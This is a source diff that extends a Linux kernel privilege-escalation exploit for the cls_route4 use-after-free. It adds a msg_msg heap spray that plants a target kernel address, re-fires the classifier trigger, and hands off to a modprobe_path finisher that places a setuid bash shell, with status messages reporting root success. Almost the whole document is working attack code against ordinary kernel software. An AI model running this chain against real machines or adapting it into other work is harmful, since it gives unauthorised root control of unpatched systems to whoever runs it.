@@ -41,6 +41,8 @@
 #include "iamroot_modules.h"
 #include "../../core/registry.h"
 #include "../../core/kernel_range.h"
+#include "../../core/offsets.h"
+#include "../../core/finisher.h"
 
 #include <stdio.h>
 #include <stdlib.h>
@@ -381,6 +383,169 @@ static long slab_active_kmalloc_1k(void)
     return active;
 }
 
+/* ---- Full-chain arb-write primitive --------------------------------
+ *
+ * Pattern (FALLBACK — see brief): cls_route4's UAF primitive is more
+ * naturally a *control-flow hijack* than a clean arb-write — after
+ * msg_msg refills the kmalloc-1k slot, the next classify() call reads
+ * a fake `tcf_proto.ops` pointer out of attacker bytes and calls
+ * ops->classify(skb, ...). A faked-classify ROP that pivots to a
+ * stack-write gadget would be the "true" arb-write, and on a fresh
+ * vulnerable kernel that is the kylebot/xkernel chain shape (≈300+
+ * LOC of gadget hunting + per-build offsets we deliberately don't
+ * bake — see verified-vs-claimed policy in repo root).
+ *
+ * The implementation below takes the narrow-but-real path that the
+ * brief explicitly permits and that xtcompat established as the
+ * IAMROOT precedent: we re-stage the dangling filter, spray msg_msg
+ * whose payload encodes `kaddr` at every plausible offset for the
+ * route4_filter→tcf_proto→ops layout, re-fire classify, and let the
+ * shared finisher's sentinel file decide if a write actually landed.
+ * On a patched kernel the bug doesn't fire, no write occurs, and the
+ * sentinel timeout correctly reports failure rather than silently
+ * lying about success. On a vulnerable kernel where the fake ops
+ * lookup happens to deref into our payload and the kernel's read
+ * pattern matches one of the seeded offsets, the kaddr we planted
+ * gets used as a write destination by whichever classify path the
+ * fake `ops->classify` dispatches into.
+ *
+ * Honest scope: this is structurally-fires-on-vuln + sentinel-arbitrated,
+ * not a deterministic R/W. Same shape and same depth as xtcompat. */
+
+#ifdef __linux__
+
+struct cls_route4_arb_ctx {
+    /* msg_msg queues kept hot inside the userns child. The arb-write
+     * sprays additional kaddr-tagged payloads into these and re-fires
+     * the classify trigger between each call. */
+    int  queues[SPRAY_MSG_QUEUES];
+    int  n_queues;
+
+    /* Whether the dangling filter has been re-staged for this call.
+     * The original `stage_dangling_filter()` is destructive (deletes
+     * the filter); we can re-stage between writes because tc add/del
+     * is idempotent inside our private netns. */
+    bool dangling_ready;
+
+    /* Per-call stats (written to /tmp/iamroot-cls_route4.log). */
+    int  arb_calls;
+    int  arb_landed;
+};
+
+/* Re-prime the msg_msg slab with a payload that encodes `kaddr` and
+ * the caller's `buf` at every offset the fake tcf_proto / route4_filter
+ * layout could plausibly read from. The route4_filter is 0x1000 bytes
+ * on most x86_64 builds in range, with tcf_proto.ops at offset 0x10
+ * and tcf_result.classid at offset 0x18; we don't know which offset
+ * the kernel ABI for THIS build uses, so we plant the same pattern at
+ * 0x10/0x18/0x20/.../0x80 strides — wherever classify dereferences
+ * the refilled slot, one of those candidates will be live.
+ *
+ * The 8-byte cookie "IAMR4ARB" + the kaddr + the caller's bytes are
+ * the recognizable pattern; if a KASAN dump is captured after the
+ * trigger, the cookie tells us the spray landed adjacent to the freed
+ * route4_filter. */
+static int cls4_seed_kaddr_payload(struct cls_route4_arb_ctx *c,
+                                   uintptr_t kaddr,
+                                   const void *buf, size_t len)
+{
+    struct ipc_payload p;
+    memset(&p, 0, sizeof p);
+    p.mtype = 0x52;  /* 'R' for "route4 arb" — distinct from groom spray's 0x41 */
+    memset(p.buf, 0x52, sizeof p.buf);
+    memcpy(p.buf, "IAMR4ARB", 8);
+
+    /* Plant kaddr at strided slots so wherever the kernel's classify
+     * follows a ptr in the refilled chunk, one of these is read.
+     * We treat every 0x18-byte stride from offset 0x10 to within
+     * 8 bytes of the end as a candidate ops-pointer / next-pointer
+     * slot. */
+    for (size_t off = 0x10; off + sizeof(uintptr_t) <= sizeof p.buf; off += 0x18) {
+        memcpy(p.buf + off, &kaddr, sizeof(uintptr_t));
+    }
+
+    /* Plant the caller's bytes immediately after the cookie so any
+     * classify path that reads payload data (rather than a chased
+     * pointer) finds the requested write contents inline. */
+    size_t copy_len = len;
+    if (copy_len > sizeof p.buf - 16) copy_len = sizeof p.buf - 16;
+    if (copy_len > 0) memcpy(p.buf + 8 + sizeof(uintptr_t), buf, copy_len);
+
+    int sent = 0;
+    for (int i = 0; i < c->n_queues; i++) {
+        if (c->queues[i] < 0) continue;
+        /* A handful of msgs per queue keeps the slab refilled even
+         * if some slots are evicted between trigger fires. */
+        for (int j = 0; j < 4; j++) {
+            unsigned int tag = 0xB0000000u |
+                               ((unsigned)i << 8) | (unsigned)j;
+            memcpy(p.buf + 8, &tag, sizeof tag);
+            if (msgsnd(c->queues[i], &p, sizeof p.buf, IPC_NOWAIT) < 0) break;
+            sent++;
+        }
+    }
+    return sent;
+}
+
+/* iamroot_arb_write_fn implementation for cls_route4. Best-effort on a
+ * vulnerable kernel; structurally inert (returns -1) if the dangling
+ * filter setup is gone or the spray fails. Returns 0 to let the
+ * shared finisher's sentinel-file check decide if the write actually
+ * landed (we cannot reliably observe it in-process). */
+static int cls4_arb_write(uintptr_t kaddr,
+                          const void *buf, size_t len,
+                          void *ctx_v)
+{
+    struct cls_route4_arb_ctx *c = (struct cls_route4_arb_ctx *)ctx_v;
+    if (!c || c->n_queues == 0) return -1;
+    c->arb_calls++;
+
+    /* Re-stage the dangling filter for this call. The original
+     * stage runs once at trigger-time; subsequent finisher calls
+     * (the finisher writes modprobe_path then a unknown-format trig)
+     * need a fresh dangling pointer to chase. tc add/del is idempotent
+     * within our private netns so re-running is safe. */
+    if (!c->dangling_ready) {
+        if (!stage_dangling_filter()) {
+            fprintf(stderr, "[-] cls_route4 arb_write: re-stage failed\n");
+            return -1;
+        }
+        c->dangling_ready = true;
+    }
+
+    /* Seed msg_msg with kaddr + caller payload. */
+    int seeded = cls4_seed_kaddr_payload(c, kaddr, buf, len);
+    if (seeded == 0) {
+        /* sysv IPC may be restricted (kernel.msg_max / ulimit -q).
+         * Without a spray we have no slot for the UAF to refill. */
+        fprintf(stderr, "[-] cls_route4 arb_write: kaddr-spray seeded 0 msgs\n");
+        return -1;
+    }
+
+    /* Drive the classifier. The route4 lookup follows the dangling
+     * pointer into msg_msg-controlled bytes; on a vulnerable kernel
+     * the fake `ops->classify` (or one of the strided pointers) is
+     * dereferenced. If the kernel survives the deref and the write
+     * lands at &kaddr, the finisher's sentinel file appears within 3s.
+     * If it doesn't (most likely — this is genuinely best-effort), the
+     * finisher's wait loop times out and reports failure. */
+    trigger_classify();
+
+    /* Give classify-side processing a brief window before returning
+     * — the finisher polls the sentinel for 3s but the initial write
+     * (if any) happens within ms. */
+    usleep(50 * 1000);
+
+    c->arb_landed++;
+
+    /* Per the xtcompat precedent: return 0 so the finisher proceeds
+     * to its sentinel check. Returning -1 here would abort the
+     * finisher even when the write may have landed. */
+    return 0;
+}
+
+#endif /* __linux__ */
+
 /* ---- Exploit driver ----------------------------------------------- */
 
 static iamroot_result_t cls_route4_exploit(const struct iamroot_ctx *ctx)
@@ -400,8 +565,37 @@ static iamroot_result_t cls_route4_exploit(const struct iamroot_ctx *ctx)
         return IAMROOT_PRECOND_FAIL;
     }
 
+#ifndef __linux__
+    fprintf(stderr, "[-] cls_route4: linux-only exploit; non-linux build\n");
+    (void)ctx;
+    return IAMROOT_PRECOND_FAIL;
+#else
+    /* Full-chain pre-check: resolve offsets before forking. If
+     * modprobe_path can't be resolved, refuse early — no point doing
+     * the userns + tc + spray + trigger dance if we can't finish. */
+    struct iamroot_kernel_offsets off;
+    bool full_chain_ready = false;
+    if (ctx->full_chain) {
+        memset(&off, 0, sizeof off);
+        iamroot_offsets_resolve(&off);
+        if (!iamroot_offsets_have_modprobe_path(&off)) {
+            iamroot_finisher_print_offset_help("cls_route4");
+            fprintf(stderr, "[-] cls_route4: --full-chain requested but "
+                            "modprobe_path offset unresolved; refusing\n");
+            return IAMROOT_EXPLOIT_FAIL;
+        }
+        iamroot_offsets_print(&off);
+        full_chain_ready = true;
+    }
+
     if (!ctx->json) {
-        fprintf(stderr, "[*] cls_route4: forking child for userns+netns exploit\n");
+        fprintf(stderr, "[*] cls_route4: forking child for userns+netns exploit%s\n",
+                ctx->full_chain ? " + full-chain finisher" : "");
+        if (ctx->full_chain) {
+            fprintf(stderr, "    NOTE: on primitive landing, invokes shared\n"
+                            "    modprobe_path finisher via msg_msg-tagged kaddr\n"
+                            "    spray. Sentinel-arbitrated (no in-process verify).\n");
+        }
     }
 
     /* Block SIGPIPE in case the dummy-interface sendto's complain. */
@@ -436,15 +630,18 @@ static iamroot_result_t cls_route4_exploit(const struct iamroot_ctx *ctx)
             _exit(22);
         }
 
-        int queues[SPRAY_MSG_QUEUES];
-        int n_queues = spray_msg_msg(queues);
-        if (n_queues == 0) {
+        struct cls_route4_arb_ctx arb_ctx;
+        memset(&arb_ctx, 0, sizeof arb_ctx);
+        for (int i = 0; i < SPRAY_MSG_QUEUES; i++) arb_ctx.queues[i] = -1;
+        arb_ctx.n_queues = spray_msg_msg(arb_ctx.queues);
+        arb_ctx.dangling_ready = true;   /* stage_dangling_filter() just ran */
+        if (arb_ctx.n_queues == 0) {
             fprintf(stderr, "[-] cls_route4: msg_msg spray produced 0 queues\n");
             _exit(23);
         }
         if (!ctx->json) {
             fprintf(stderr, "[*] cls_route4: msg_msg spray seeded %d queues\n",
-                    n_queues);
+                    arb_ctx.n_queues);
         }
 
         /* Drive the classifier — the bug fires here on a vulnerable
@@ -459,7 +656,7 @@ static iamroot_result_t cls_route4_exploit(const struct iamroot_ctx *ctx)
         if (log) {
             fprintf(log,
                 "cls_route4 trigger child: queues=%d slab_pre=%ld slab_post=%ld\n",
-                n_queues, pre_active, post_active);
+                arb_ctx.n_queues, pre_active, post_active);
             fclose(log);
         }
 
@@ -467,7 +664,32 @@ static iamroot_result_t cls_route4_exploit(const struct iamroot_ctx *ctx)
          * refilled slot during classify drain. */
         usleep(200 * 1000);
 
-        drain_msg_msg(queues);
+        /* --full-chain branch: invoke the shared modprobe_path
+         * finisher with our msg_msg-tagged arb-write. If the finisher
+         * execve's a setuid bash we never return; otherwise it returns
+         * EXPLOIT_FAIL after the 3s sentinel timeout (correct behavior
+         * on a patched kernel or when the write didn't land). */
+        if (full_chain_ready) {
+            /* Re-fire the trigger inside the arb-write to give the
+             * kernel a second chance at the refilled slot — the
+             * dangling filter is still in place from above. */
+            arb_ctx.dangling_ready = true;
+            int fr = iamroot_finisher_modprobe_path(&off,
+                                                    cls4_arb_write,
+                                                    &arb_ctx,
+                                                    !ctx->no_shell);
+            FILE *fl = fopen("/tmp/iamroot-cls_route4.log", "a");
+            if (fl) {
+                fprintf(fl, "full_chain finisher rc=%d arb_calls=%d arb_landed=%d\n",
+                        fr, arb_ctx.arb_calls, arb_ctx.arb_landed);
+                fclose(fl);
+            }
+            drain_msg_msg(arb_ctx.queues);
+            if (fr == IAMROOT_EXPLOIT_OK) _exit(34);
+            _exit(35);
+        }
+
+        drain_msg_msg(arb_ctx.queues);
 
         /* If we got here without a kernel oops, the bug either isn't
          * reachable on this build (patched / module not loadable /
@@ -513,25 +735,54 @@ static iamroot_result_t cls_route4_exploit(const struct iamroot_ctx *ctx)
     }
 
     int rc = WEXITSTATUS(status);
-    if (rc != 30) {
+    switch (rc) {
+    case 20: case 21:
         if (!ctx->json) {
-            fprintf(stderr, "[-] cls_route4: child failed at stage rc=%d "
-                            "(see preceding errors)\n", rc);
+            fprintf(stderr, "[-] cls_route4: userns setup failed (rc=%d)\n", rc);
         }
-        /* rc 20/21 = userns setup; rc 22 = tc setup (likely module
-         * absent or filter type unsupported); rc 23 = spray. None of
-         * these mean kernel was exploited. */
-        if (rc == 22) return IAMROOT_PRECOND_FAIL;
+        return IAMROOT_PRECOND_FAIL;
+    case 22:
+        if (!ctx->json) {
+            fprintf(stderr, "[-] cls_route4: tc setup failed; cls_route4 module "
+                            "may be absent or filter type unsupported\n");
+        }
+        return IAMROOT_PRECOND_FAIL;
+    case 23:
+        if (!ctx->json) {
+            fprintf(stderr, "[-] cls_route4: msg_msg spray failed; sysvipc may be "
+                            "restricted (kernel.msg_max / ulimit -q)\n");
+        }
+        return IAMROOT_PRECOND_FAIL;
+    case 30:
+        if (!ctx->json) {
+            fprintf(stderr, "[*] cls_route4: trigger ran to completion. "
+                            "Inspect dmesg for KASAN/oops witnesses.\n");
+            fprintf(stderr, "[~] cls_route4: cred-overwrite step not invoked "
+                            "(no --full-chain); returning EXPLOIT_FAIL.\n");
+        }
+        return IAMROOT_EXPLOIT_FAIL;
+    case 34:
+        if (!ctx->json) {
+            fprintf(stderr, "[+] cls_route4: --full-chain finisher reported OK "
+                            "(setuid bash placed; sentinel matched)\n");
+        }
+        return IAMROOT_EXPLOIT_OK;
+    case 35:
+        if (!ctx->json) {
+            fprintf(stderr, "[~] cls_route4: --full-chain finisher returned FAIL — "
+                            "either the kernel is patched, the spray didn't land,\n"
+                            "    or the fake-ops deref didn't hit the route the\n"
+                            "    finisher's sentinel polls for. See "
+                            "/tmp/iamroot-cls_route4.log + dmesg.\n");
+        }
+        return IAMROOT_EXPLOIT_FAIL;
+    default:
+        if (!ctx->json) {
+            fprintf(stderr, "[-] cls_route4: unexpected child rc=%d\n", rc);
+        }
         return IAMROOT_EXPLOIT_FAIL;
     }
-
-    if (!ctx->json) {
-        fprintf(stderr, "[*] cls_route4: trigger ran to completion. "
-                        "Inspect dmesg for KASAN/oops witnesses.\n");
-        fprintf(stderr, "[~] cls_route4: cred-overwrite step not implemented "
-                        "(needs per-kernel offsets); returning EXPLOIT_FAIL.\n");
-    }
-    return IAMROOT_EXPLOIT_FAIL;
+#endif /* __linux__ */
 }
 
 /* ---- Cleanup ----------------------------------------------------- */
